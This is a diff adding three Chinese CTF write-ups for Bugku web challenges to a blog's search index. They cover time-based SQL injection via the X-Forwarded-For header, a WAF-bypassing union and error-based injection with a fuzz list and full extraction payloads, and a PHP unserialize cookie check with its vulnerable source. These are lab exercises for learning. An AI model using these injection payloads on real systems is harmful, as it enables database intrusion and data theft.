@@ -1170,4 +1170,202 @@
         <tag>CTF-WEB</tag>
       </tags>
   </entry>
+  <entry>
+    <title>insert_into注入</title>
+    <url>/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/insert-into%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><p>作者终于有良心了，不好意思直接给源码就说是Python的</p>
+<a id="more"></a>
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/insert-into%E6%B3%A8%E5%85%A5/1.png" class="">
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/insert-into%E6%B3%A8%E5%85%A5/2.png" class="">
+
+<p>结合效果来看源码就是index的</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ip = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 读取IP，先尝试读取X-Forwarded-For字段，如果为空则使用源IP</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重点：以逗号切割IP并且返回第一个子串，也就是说第一个逗号之后的内容会被截断</span></span><br><span class="line">    $ip_arr = explode(<span class="string">&#x27;,&#x27;</span>, $ip);</span><br><span class="line">    <span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$user = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$pass = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$db = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to select database&quot;</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;your ip is :&#x27;</span> . $ip;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将IP插入到数据库中，只能时间盲注</span></span><br><span class="line">$sql = <span class="string">&quot;insert into client_ip (ip) values (&#x27;$ip&#x27;)&quot;</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>总计一下：以逗号对XFF头进行截断然后插入到数据库中</p>
+<h2 id="摸索注入"><a href="#摸索注入" class="headerlink" title="摸索注入"></a>摸索注入</h2><p>既然是以逗号作为截断符，payload中就不能使用逗号了，对于一些常用的时间盲注函数也就不能按照传统方式调用了</p>
+<p>采用的无逗号方案：</p>
+<ul>
+<li><p>采用case when 代替if进行时间盲注</p>
+</li>
+<li><p>采用substr([str] from [from] for [len])来代替传统方式</p>
+</li>
+<li><p>用limit [len] offset [offset] 代替 limit [offset],[len]</p>
+</li>
+</ul>
+<p>解决了逗号的问题接下来就可以放心的注入了</p>
+<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>由于时间盲注非常考验耐心所以手工测试行不通，准备Python吧</p>
+<p>首先说明一下，有些WP上来就猜到了flag在flag表的flag列，首先这确实是做多了CTF的经验，不过从SQL注入角度来说直接猜还是略显不足的，所以我们还是从头开始编写脚本逐步探测数据库，数据表，字段最后提取行数据</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="comment"># 脚本丢了，稍后发吧</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>绕过WAF和脚本编写能力很重要</p>
+]]></content>
+      <categories>
+        <category>CTF-Bugku(旧版)-WEB</category>
+      </categories>
+      <tags>
+        <tag>CTF-WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>多次</title>
+    <url>/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/</url>
+    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/1.png" class="">
+
+<p>提示有两个flag</p>
+<a id="more"></a>
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/2.png" class="">
+
+<p>感觉像经典的SQL注入</p>
+<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><p>鉴于本题逼近末尾，且分值比较高，绝对会有WAF，所以手工测试很难受，上fuzz</p>
+<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ol>
+<li><p>手工测试一下，发现页面只有正确结果和Error两种情况，且数值固定</p>
+</li>
+<li><p>明确常见的WAF(CTF专用版)的过滤机制</p>
+</li>
+</ol>
+<ul>
+<li>过滤敏感字符：单双引号、括号等等</li>
+<li>过滤关键词：AND、OR、UNION、SELECT等</li>
+<li>很少用正则匹配恶意数据</li>
+</ul>
+<p>基于此，给出一个简单的测试字典，主要测试过滤关键字词以及是否大小写敏感</p>
+<p>1– -<br>1’– -<br>1”– -<br>1’)– -<br>1”)– -<br>1 AND 1– -<br>1 AnD 1– -<br>1 AandND 1– -<br>1’ AND 1– -<br>1’ AnD 1– -<br>1’ AandND 1– -<br>1” AND 1– -<br>1” AnD 1– -<br>1” AandND 1– -<br>1’) AND 1– -<br>1’) AnD 1– -<br>1’) AandND 1– -<br>1”) AND 1– -<br>1”) AnD 1– -<br>1”) AandND 1 – -</p>
+<h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p>BP启动，intruder走起</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/3.png" class="">
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/4.png" class="">
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/5.png" class="">
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/6.png" class="">
+
+<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>仔细分析返回结果可以发现</p>
+<ol>
+<li>发生错误的页面payload中均包含单引号</li>
+<li>WAF从参数中剔除了关键词(对比9、10、11行)</li>
+</ol>
+<p>基于分析结果，再次测试闭合方式是否为单引号</p>
+<p>payload：</p>
+<ul>
+<li>0’OorR’1</li>
+<li>1’AandND’0</li>
+<li>1’AandND’1</li>
+</ul>
+<p>可以确定闭合方式是单引号，同时确定了没有返回结果时会报Error</p>
+<p>顺带测试一下需要用到的关键词：UNION SELECT WHERE</p>
+<h2 id="顺风顺水"><a href="#顺风顺水" class="headerlink" title="顺风顺水"></a>顺风顺水</h2><p>既然信息已经探测的足够多了，接下来就是正常的注入过程了</p>
+<h3 id="探测字段及回显位置"><a href="#探测字段及回显位置" class="headerlink" title="探测字段及回显位置"></a>探测字段及回显位置</h3><p>payload：0’ UunionNION SselectELECT 1,2– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/7.png" class="">
+
+<p>确定第二列回显</p>
+<h3 id="探测当前数据库中的所有表"><a href="#探测当前数据库中的所有表" class="headerlink" title="探测当前数据库中的所有表"></a>探测当前数据库中的所有表</h3><p>payload：0’ UNunionION SEselectLECT 1,group_concat(table_name) from infOorRmation_schema.tables where table_schema=database()– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/8.png" class="">
+
+<p>flag1表相当可疑</p>
+<h3 id="探测flag1表中所有的字段"><a href="#探测flag1表中所有的字段" class="headerlink" title="探测flag1表中所有的字段"></a>探测flag1表中所有的字段</h3><p>payload：0’ UNunionION SEselectLECT 1,group_concat(column_name) from infOorRmation_schema.columns where table_schema=database() ANandD table_name=’flag1’– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/9.png" class="">
+
+<h3 id="获取flag1表中所有的行"><a href="#获取flag1表中所有的行" class="headerlink" title="获取flag1表中所有的行"></a>获取flag1表中所有的行</h3><p>payload：0’ UNunionION SEselectLECT 1,group_concat(flag1,0x2d,address) from flag1;– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/10.png" class="">
+
+<p>前面看着像base64，果断解码（别忘了排除连接符 - ），结果如下</p>
+<p>flag1：好吧你会SQL注入</p>
+<p>address：./Once_More.php</p>
+<p>给出了另一个地址。</p>
+<h2 id="再次征战"><a href="#再次征战" class="headerlink" title="再次征战"></a>再次征战</h2><p>访问Once_More.php</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/11.png" class="">
+
+<p>不得不说，场面极度嚣张，既然提示了ID是1，尝试提交id参数</p>
+<p>经过测试，发现id在1-7之间返回 I am here，反之返回nobody，典型的布尔盲注</p>
+<h3 id="再次fuzz"><a href="#再次fuzz" class="headerlink" title="再次fuzz"></a>再次fuzz</h3><p>还是老套路，抓包intruder一把梭</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/12.png" class="">
+
+<p>这回有意思了，直接报错（的确是没想到）</p>
+<p>结合payload和报错，可以知道又是单引号闭合</p>
+<p>但是测试了一下发现UNION SELECT过滤的死死的，直接回显看来无望了</p>
+<h2 id="往事如烟"><a href="#往事如烟" class="headerlink" title="往事如烟"></a>往事如烟</h2><p>==，好像除了联合查询还可以用强制报错回显数据啊</p>
+<p>果断构造经典的报错payload：1’ and extractvalue(1,concat(0x7e,database(),0x7e))– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/14.png" class="">
+
+<p>YES，成功获取当前使用的数据库名称</p>
+<p>Note：你问我为什么不用updatexml？因为updatexml有三个参数，而且第三个参数总是忘记。。。</p>
+<h2 id="乘风破浪"><a href="#乘风破浪" class="headerlink" title="乘风破浪"></a>乘风破浪</h2><h3 id="探测当前数据库中所有的表"><a href="#探测当前数据库中所有的表" class="headerlink" title="探测当前数据库中所有的表"></a>探测当前数据库中所有的表</h3><p>payload：1’ and extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/15.png" class="">
+
+<h3 id="探测flag2表中所有的字段"><a href="#探测flag2表中所有的字段" class="headerlink" title="探测flag2表中所有的字段"></a>探测flag2表中所有的字段</h3><p>payload：1’ and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’flag2’),0x7e))– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/16.png" class="">
+
+<h3 id="获取flag2表所有的行"><a href="#获取flag2表所有的行" class="headerlink" title="获取flag2表所有的行"></a>获取flag2表所有的行</h3><p>payload：1’ and extractvalue(1,concat(0x7e,(SELECT group_concat(flag2,0x26,address) FROM flag2),0x7e))– -</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/17.png" class="">
+
+<p>拿下flag，提交的时候却显示失败，此时突然想到了上次踩的坑，看了看题干，淡定的把字母都转换为小写，完美通过</p>
+<h2 id="个人心得"><a href="#个人心得" class="headerlink" title="个人心得"></a>个人心得</h2><p>这道题出的很NICE，既锻炼纯手工注入能力，又要求对SQLI技术有较为全面的掌握，同时还可以训练一下fuzz；实战意义很大，建议多多思考练习</p>
+]]></content>
+      <categories>
+        <category>CTF-Bugku(旧版)-WEB</category>
+      </categories>
+      <tags>
+        <tag>CTF-WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flag.php</title>
+    <url>/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/</url>
+    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/1.png" class="">
+
+<p>题干很重要，先记一记</p>
+<a id="more"></a>
+
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/2.png" class="">
+
+<p>经典的登录框</p>
+<h2 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h2><p>根据标题和URL路径提示，习惯性的访问了一下flag.php发现存在且只有一行，很可能是flag变量的定义</p>
+<p>为求谨慎，扫描了一下目录，发现只有index和flag两个页面</p>
+<p>看看题干，首先说点了login为什么没反应，看看源码呗</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/3.png" class="">
+
+<p>你个糟老头子坏得很，这要是有反应就见鬼了</p>
+<p>看来这题要么就是爆破要么就是注入，为了方便起见我们先用BP自动修改HTML</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/4.png" class="">
+
+<p>这样再刷新就可以直接提交了</p>
+<p>接下来就是尝试时间了，爆破注入全都不好使，看来应该不是从这里入手</p>
+<h2 id="陷入迷雾"><a href="#陷入迷雾" class="headerlink" title="陷入迷雾"></a>陷入迷雾</h2><p>题干的第一句话已经解决了（虽然没什么用）</p>
+<p>看来破案的重点就是第二个提示：hint，这个单词究竟有什么深邃的含义呢？</p>
+<p>就在万般无奈的时候，看了一眼桌上的A4纸，突然想到了一个单词：margin</p>
+<p>记得以前的题目中margin是作为参数的，那么这次会不会也是</p>
+<p>果然提交hint参数</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/5.png" class="">
+
+<p>这hint可真够劲，GOOD，GOOD，six six six</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">&quot;$KEY&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$flag&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">        &lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;#&quot;</span>&gt;</span><br><span class="line">            &lt;p&gt;&lt;input name=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input name=<span class="string">&quot;password&quot;</span> type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input value=<span class="string">&quot;Login&quot;</span> type=<span class="string">&quot;submit&quot;</span>/&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$KEY = <span class="string">&#x27;ISecer:www.isecer.com&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>总结一下：当cookie参数ISecer反序列化后完全等于变量KEY时输出flag</p>
+<p>代码不难但是陷阱到不少，主要有二：</p>
+<ol>
+<li>看下格式化之后的代码，你发现了什么？</li>
+<li>KEY变量被赋值的位置</li>
+<li>老规矩，看不懂私信我，包教包会</li>
+</ol>
+<h2 id="羽化登仙"><a href="#羽化登仙" class="headerlink" title="羽化登仙"></a>羽化登仙</h2><p>填了坑，接下来就是舒服的获取flag环节了</p>
+<p>Note：写到这里突然发现前面写的都凭空消失了，WTFK????????? 还好有Git，还原了文件内容，GIT牛脾</p>
+<p>小插曲不要紧，flag才重要，上图</p>
+<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/6.png" class="">
+
+<p>YES，收工</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>GIT真香</p>
+<p>说错了，是具备良好的基础很重要</p>
+<p>其实上一句也不重要，最重要的是不要被作者忽悠</p>
+<p>其实也不对，相信自己的判断吧</p>
+]]></content>
+      <categories>
+        <category>CTF-Bugku(旧版)-WEB</category>
+      </categories>
+      <tags>
+        <tag>CTF-WEB</tag>
+      </tags>
+  </entry>
 </search>
